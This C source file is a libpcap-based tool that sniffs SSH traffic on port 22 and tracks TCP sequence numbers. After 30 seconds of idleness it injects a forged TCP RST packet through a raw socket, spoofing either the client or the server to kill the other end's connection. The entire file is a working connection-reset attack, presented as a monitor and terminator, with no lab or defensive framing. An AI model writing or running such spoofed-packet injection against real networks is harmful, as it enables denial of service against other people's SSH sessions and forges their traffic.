#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

// --- Definitions ---
#define TARGET_CLIENT 1
#define TARGET_SERVER 2

// Pseudo-header for TCP Checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Global State
time_t last_activity = 0;
int is_stabilized = 0;
int user_target_choice = 0;
char interface[] = "eth0"; // CHANGE THIS to your interface (e.g., wlan0, ens33)

// To store connection details for the attack
struct {
    struct in_addr src_ip;
    struct in_addr dst_ip;
    uint16_t src_port;
    uint16_t dst_port;
    uint32_t seq;
    uint32_t ack;
    int valid;
} current_conn;

pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

// --- Helper: Checksum Calculation ---
unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

// --- Function: Send RST Packet ---
void send_rst_packet() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    // Enable IP_HDRINCL to tell kernel we are providing the IP header
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt failed");
        return;
    }

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct pseudo_header psh;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    
    // Determine Target Logic
    // If we want to kill the Client, we spoof the Server.
    // If we want to kill the Server, we spoof the Client.
    if (user_target_choice == TARGET_CLIENT) {
        printf("[*] Spoofing Server to kill CLIENT connection...\n");
        iph->saddr = current_conn.dst_ip.s_addr; // Spoof Server IP
        iph->daddr = current_conn.src_ip.s_addr; // Target Client IP
        tcph->source = current_conn.dst_port;    // Spoof Server Port
        tcph->dest = current_conn.src_port;      // Target Client Port
        tcph->seq = current_conn.ack;            // Must match what Client expects
    } else {
        printf("[*] Spoofing Client to kill SERVER connection...\n");
        iph->saddr = current_conn.src_ip.s_addr; // Spoof Client IP
        iph->daddr = current_conn.dst_ip.s_addr; // Target Server IP
        tcph->source = current_conn.src_port;    // Spoof Client Port
        tcph->dest = current_conn.dst_port;      // Target Server Port
        tcph->seq = current_conn.seq;            // Must match what Server expects
    }

    sin.sin_addr.s_addr = iph->daddr;

    // --- Fill IP Header ---
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Calculate later
    iph->check = checksum((unsigned short *)datagram, iph->tot_len);

    // --- Fill TCP Header ---
    tcph->ack_seq = 0;
    tcph->doff = 5; // Data offset
    tcph->fin=0; tcph->syn=0; tcph->rst=1; tcph->psh=0; tcph->ack=0; tcph->urg=0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // --- TCP Checksum Calculation (Pseudo Header is required) ---
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);

    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr));

    tcph->check = checksum((unsigned short*) pseudogram , psize);

    // Send the packet
    if (sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("Sendto failed");
    } else {
        printf("[***] TCP RST Packet Sent! Connection should terminate.\n");
    }

    free(pseudogram);
    close(sock);
}

// --- Thread: Monitor ---
void *monitor_routine(void *arg) {
    printf("[Monitor Thread] Waiting for activity...\n");
    while (1) {
        sleep(1);
        pthread_mutex_lock(&lock);
        
        if (last_activity != 0) {
            time_t now = time(NULL);
            double diff = difftime(now, last_activity);

            if (diff >= 30.0 && !is_stabilized && current_conn.valid) {
                printf("\n[***] Connection Stabilized (30s timeout)!\n");
                is_stabilized = 1;
                send_rst_packet();
                exit(0); // Exit program after termination
            }
        }
        pthread_mutex_unlock(&lock);
    }
    return NULL;
}

// --- Callback: Packet Handler ---
void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct iphdr *iph = (struct iphdr *)(packet + 14); // Skip Ethernet (14 bytes)
    int ip_header_len = iph->ihl * 4;
    
    struct tcphdr *tcph = (struct tcphdr *)(packet + 14 + ip_header_len);
    int tcp_header_len = tcph->doff * 4;

    // Calculate Payload Size
    // Total Len (ntohs) - IP Header - TCP Header
    int payload_len = ntohs(iph->tot_len) - ip_header_len - tcp_header_len;

    pthread_mutex_lock(&lock);

    // 1. Update Timer
    last_activity = time(NULL);
    if (is_stabilized) {
        printf("[!] New packet detected! Resetting stabilization timer.\n");
        is_stabilized = 0;
    }

    // 2. Capture Connection Info (Assume Client initiates to Port 22)
    // We update this constantly to get the latest Sequence numbers for the RST attack
    if (ntohs(tcph->dest) == 22) {
        current_conn.src_ip = (struct in_addr){iph->saddr};
        current_conn.dst_ip = (struct in_addr){iph->daddr};
        current_conn.src_port = tcph->source; // Network Byte Order
        current_conn.dst_port = tcph->dest;
        
        // Next expected SEQ by server is current SEQ + Payload Len
        // (If SYN/FIN flags are set, they consume +1 seq, ignored here for simplicity in established state)
        current_conn.seq = ntohl(tcph->seq) + payload_len; 
        current_conn.ack = ntohl(tcph->ack_seq);
        current_conn.valid = 1;
    }

    // 3. Display Headers if NO Data (Control Packet)
    if (payload_len == 0) {
        printf("\n[+] Control Packet Detected (Len: 0)\n");
        printf("    IP Header -> Src: %s", inet_ntoa(*(struct in_addr*)&iph->saddr));
        printf(" Dst: %s\n", inet_ntoa(*(struct in_addr*)&iph->daddr));
        printf("    IP Fields -> ID: %d, TTL: %d, Checksum: %d\n", ntohs(iph->id), iph->ttl, ntohs(iph->check));
        
        printf("    TCP Header -> Sport: %d, Dport: %d\n", ntohs(tcph->source), ntohs(tcph->dest));
        printf("    TCP Fields -> Seq: %u, Ack: %u, Flags: ", ntohl(tcph->seq), ntohl(tcph->ack_seq));
        if(tcph->syn) printf("SYN ");
        if(tcph->ack) printf("ACK ");
        if(tcph->fin) printf("FIN ");
        if(tcph->rst) printf("RST ");
        printf("\n-------------------------------------------------\n");
    }

    pthread_mutex_unlock(&lock);
}

int main() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    struct bpf_program fp;
    char filter_exp[] = "tcp port 22"; // Strict SSH filter
    bpf_u_int32 net = 0;

    // 1. User Input
    char choice;
    printf("--- C Network Monitor & Terminator ---\n");
    printf("Enter interface to sniff (default eth0): ");
    char input_iface[50];
    if (fgets(input_iface, sizeof(input_iface), stdin)) {
        input_iface[strcspn(input_iface, "\n")] = 0; // Remove newline
        if(strlen(input_iface) > 0) strcpy(interface, input_iface);
    }
    
    printf("Target to Disconnect: (C)lient or (S)erver? ");
    scanf(" %c", &choice);
    if (choice == 'C' || choice == 'c') user_target_choice = TARGET_CLIENT;
    else if (choice == 'S' || choice == 's') user_target_choice = TARGET_SERVER;
    else { printf("Invalid choice.\n"); return 1; }

    // 2. Start Monitor Thread
    pthread_t tid;
    if (pthread_create(&tid, NULL, monitor_routine, NULL) != 0) {
        perror("Thread creation failed");
        return 1;
    }

    // 3. Setup Pcap Sniffing
    printf("[*] Opening device %s for sniffing...\n", interface);
    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
        return 2;
    }

    // Compile and apply filter
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return 2;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return 2;
    }

    // 4. Start Sniffing Loop
    printf("[*] Sniffing started on %s. Waiting for SSH (Port 22)...\n", interface);
    pcap_loop(handle, -1, packet_handler, NULL);

    pcap_close(handle);
    return 0;
}